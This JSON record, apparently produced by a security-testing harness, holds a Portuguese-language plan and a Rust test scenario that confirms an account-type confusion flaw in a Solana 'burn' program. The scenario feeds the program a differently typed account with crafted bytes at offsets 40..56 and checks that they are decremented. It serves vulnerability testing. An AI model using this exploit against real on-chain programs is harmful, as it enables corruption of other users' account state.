{
  "plan": "O programa `burn` (Pinocchio) lê supply e balance diretamente dos offsets 40..48 e 48..56 dos dados da conta, sem verificar discriminador de tipo. Vou montar um baseline legítimo com uma conta do tipo esperado (dados com supply=1000, balance=500 nos offsets corretos) e chamar burn com amount=100, que deve ter sucesso. No ataque, forneço uma conta de outro tipo (dados com layout diferente, mas com bytes 40..56 preenchidos com valores que serão interpretados como supply/balance) e chamo burn com amount=100; se o programa aceitar, ele alterará os bytes 40..56 dessa conta estranha. O efeito medido é que os bytes 40..56 da conta de tipo diferente foram modificados pela instrução, demonstrando que uma conta de outro tipo foi aceita no lugar do ledger esperado.",
  "scenario": "let program_id = env.program_id;

// Conta legítima do tipo esperado: dados com supply=1000 (offset 40) e balance=500 (offset 48)
let mut legit_data = vec![0u8; 56];
legit_data[40..48].copy_from_slice(&1000u64.to_le_bytes());
legit_data[48..56].copy_from_slice(&500u64.to_le_bytes());
let legit_account = account(&program_id, &legit_data, None);

// Conta de outro tipo: dados com layout diferente, mas bytes 40..56 preenchidos com valores que serão interpretados como supply/balance
let mut other_data = vec![0u8; 64];
// preenche com um padrão qualquer para simular outro tipo
for i in 0..64 { other_data[i] = (i as u8).wrapping_mul(3); }
// sobrescreve os offsets 40..56 com valores que o burn vai ler
other_data[40..48].copy_from_slice(&2000u64.to_le_bytes());
other_data[48..56].copy_from_slice(&800u64.to_le_bytes());
let other_account = account(&program_id, &other_data, None);

// Instrução burn: discriminador IX_BURN=3 + amount u64 LE
let amount: u64 = 100;
let mut ix_data = vec![3u8];
ix_data.extend_from_slice(&amount.to_le_bytes());

// Baseline: burn na conta legítima
let baseline_ix = env.raw_ix(&ix_data, &[AccountMeta::new(legit_account.key(), false)]);
let baseline_accounts = vec![(legit_account.key(), legit_account.clone())];
let baseline_result = env.baseline("burn legítimo na conta correta", &baseline_ix, &baseline_accounts);

// Ataque: burn na conta de outro tipo
let attack_ix = env.raw_ix(&ix_data, &[AccountMeta::new(other_account.key(), false)]);
let attack_accounts = vec![(other_account.key(), other_account.clone())];
let attack_result = env.attack("burn em conta de outro tipo (cosplay)", &attack_ix, &attack_accounts);

// Efeito: se o ataque teve sucesso, os bytes 40..56 da conta de outro tipo foram alterados
if attack_result.program_result == ProgramResult::Success {
    let after_data = after(&attack_result, &other_account.key()).data();
    let new_supply = read_u64(after_data, 40);
    let new_balance = read_u64(after_data, 48);
    // O burn deveria ter subtraído 100 de supply e balance originais (2000 e 800)
    env.effect("supply da conta de outro tipo foi decrementado", new_supply == 1900);
    env.effect("balance da conta de outro tipo foi decrementado", new_balance == 700);
}"
}

